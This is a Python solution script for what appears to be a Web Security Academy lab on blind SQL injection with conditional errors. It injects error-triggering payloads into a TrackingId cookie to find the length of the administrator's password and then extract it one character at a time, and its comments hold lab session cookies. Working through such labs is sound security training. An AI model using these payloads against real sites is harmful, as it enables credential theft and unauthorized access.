# Blind SQL injection with conditional errors


# Source was from
# https://gist.githubusercontent.com/fahmifj/1cc3e3e67362edb8ffcd093a1bf54189/raw/69aa0a58118058c6d39a136cbb0db0bbb463af1e/blind-sql.py
import requests, string, sys, warnings, time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)

req = requests.Session()
url = "https://0a56009404d8fce986b95d2b00cf0019.web-security-academy.net/"
hint = "Welcome back!"

# Cookie: TrackingId=tcMZwNITUDSIBOnJ; session=T47c8KtPXoNgwlRnTaITdVXgFfTcjgy1
password = ""  # x0yb2l2agr3j7ubh8lho // length 20
# kthtccl0eonf2ki7z3ew
index = 1
password_length = 20

# For debugging
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}
while True:
    # if index > password_length:
    #    print("\n Finished at index = ", index)
    #    break
    # for char in string.ascii_letters + string.digits:  # a-z,A-Z,0-9
    #    sys.stdout.write(f"\r[+] Password: {password}{char}")
    cookies = {
        "session": "T47c8KtPXoNgwlRnTaITdVXgFfTcjgy1",
        "TrackingId": f"tcMZwNITUDSIBOnJ' ||(SELECT CASE WHEN LENGTH(password)<{index} THEN to_char(1/0) ELSE ''END FROM users WHERE username='administrator')||'"
    }
    # TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    #    print("cookies['TrackingId']",cookies['TrackingId'])
    resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
    # print("resp = ",resp.status_code)
    # if hint in resp.text:
    if resp.status_code == 200:
        # password = password + char
        index = index + 1
        #print("current index =", index)
    else:
        password_length = index - 1
        print("\n Finished at passwod length = ", password_length)
        break

# '||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'


# Cookie: TrackingId=tcMZwNITUDSIBOnJ; session=T47c8KtPXoNgwlRnTaITdVXgFfTcjgy1
password = ""  # ag2yj74y5ng8k1uvbxni // length 21
# kthtccl0eonf2ki7z3ew
password = ""
index = 1

# For debugging
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}
while index < password_length:
    # if index > password_length:
    #    print("\n Finished at index = ", index)
    #    break
    for char in string.ascii_letters + string.digits:  # a-z,A-Z,0-9

        cookies = {
            "session": "T47c8KtPXoNgwlRnTaITdVXgFfTcjgy1",
            "TrackingId": f"tcMZwNITUDSIBOnJ' ||(SELECT CASE WHEN SUBSTR(password,{index},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END  FROM users WHERE username='administrator')||'",
        }

        #print("cookies['TrackingId']",cookies['TrackingId'])
        resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        # print("resp = ",resp.status_code)
        # if hint in resp.text:
        if resp.status_code == 200:
            continue
        else:
            index = index + 1
            password = password + char
            sys.stdout.write(f"\r[+] Password: {password}")
            sys.stdout.flush()
            #print("\nresp.status_code = 500  at cookies['TrackingId']", cookies['TrackingId'])
        #print("at char = ", char, " resp.status = ", resp.status_code)



